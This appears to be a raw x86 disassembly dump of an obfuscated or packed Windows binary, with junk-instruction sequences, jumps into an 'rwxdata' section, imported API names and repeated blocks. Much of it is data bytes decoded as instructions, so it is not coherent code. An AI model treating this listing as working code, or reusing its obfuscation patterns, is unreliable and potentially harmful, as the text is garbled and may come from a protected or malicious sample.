je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515aa3
sub esi eax
mov [ esp ] ah
call sub_5155f2
add [ eax ] al
jbe rwxdata
mov bl 0xa3
adc eax 0x6814ff1e
mul dl
dec esi
jo rwxdata
push cs
leave
xor [ edx ] bh
pop eax
out dx al
or eax 0x3a480f67
mov al 0xec
arpl [ edi ] di
push es
mov ah 0xd
xchg ecx eax
xchg edi eax
inc ecx
mov bl ch
rcr ecx cl
retn
imul ebp [ esi + 0x74 ] 0x97e90066
sub_515ab8
jmp rwxdata
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
sub_515ce9
pushfd
call sub_4cd122
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x756c6f56
insd
inc ebx
insb
outsd
jae rwxdata
add [ eax ] al
add [ edi + 0x73 ] bl
je rwxdata
add [ eax ] al
add [ ebx + 0x74 ] dl
popad
jb rwxdata
and al 0x40
je rwxdata
outsb
imul esp [ ebx + 0x6d ] 0x70
jae rwxdata
dec al
setg bl
push ebx
jb rwxdata
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
pushad
adc ecx ecx
pushad
lea esp [ esp + 0x40 ]
jb rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
imul esp [ ebx + 0x65 ] 0x5600041
add al [ eax ]
add [ eax ] al
test ch 0x67
add eax ebx
lea esp [ esp + 0x24 ]
call sub_514bac
je rwxdata
jns rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
je rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
and al 0x40
pushad
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
js rwxdata
jb rwxdata
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jne rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_515d53
push 0x2e4ccefa
lea esp [ esp + 0x30 ]
call sub_514aff
call sub_516e61
add [ eax ] al
pop edi
jae rwxdata
inc eax
jb rwxdata
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
pushad
adc ecx ecx
pushad
je rwxdata
push ecx
lea esp [ esp + 0x40 ]
imul esp [ ebx + 0x6d ] 0x70
jae rwxdata
je rwxdata
jns rwxdata
jmp rwxdata
lea esp [ esp + 0x40 ]
jb rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jmp rwxdata
and al 0x40
je rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
